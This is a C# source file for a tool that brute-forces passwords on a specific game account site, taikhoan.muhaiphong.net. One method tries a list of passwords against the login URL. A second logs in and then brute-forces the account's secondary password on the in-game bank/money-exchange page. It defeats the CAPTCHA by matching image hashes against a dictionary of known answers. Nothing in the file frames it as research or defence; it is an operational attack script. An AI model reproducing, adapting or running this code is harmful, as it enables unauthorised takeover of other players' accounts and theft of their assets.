using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using HtmlAgilityPack;

namespace WebRQ
{
    public class MuHaiPhong:MuFunc
    {
        public List<string> PassList { get; set; }
        public Dictionary<string, string> CapCha { get; set; }

        public MuHaiPhong(List<string> listpass, Dictionary<string,string> capcha  )
        {
            PassList = listpass;
            CapCha = capcha;
        }

        public string DoPass1(string username)
        {
            return (from pass in PassList let url = string.Format("http://taikhoan.muhaiphong.net/CV/Load_Content.php?Page=Login&username={0}&password={1}&login=1", username, pass) where MuWebResquest.GetContent(url) == "Successfuly" select pass).FirstOrDefault();
        }

        public string DoPass2(string username, string pass1)
        {
                const string urlcapcha = "http://taikhoan.muhaiphong.net/CV/includes/captcha/CaptchaSecurityImages.php?characters=2";
            if (Login("http://taikhoan.muhaiphong.net/CV/Load_Content.php?Page=Login&username={0}&password={1}&login=1",
                username, pass1, "Successfuly"))
            {
                foreach (var pass in PassList)
                {
                    string hash = MuWebResquest.GetHash(MuWebResquest.GetStream(urlcapcha));
                    string url = string.Format(
                        "http://taikhoan.muhaiphong.net/CV/Load_Content.php?Page=Bank_Manager/MoneyExChange&security_code={0}&passcap2={1}&money1=0&TypeDoi=1&MoneyExChange=1", CapCha[hash], pass);
                    var htmlDocument = new HtmlDocument();
                    htmlDocument.LoadHtml(MuWebResquest.GetContent(url));
                    var selectSingleNode = htmlDocument.DocumentNode.SelectSingleNode("//*[@id='dialog-message1']");
                    if (selectSingleNode==null) continue;
                    if (selectSingleNode.InnerText.Contains("thành công"))
                    {
                        return pass;
                    }
                }
            }
            return null;
        }

        public void AddMorePassList(string username)
        {

        }
    }
}
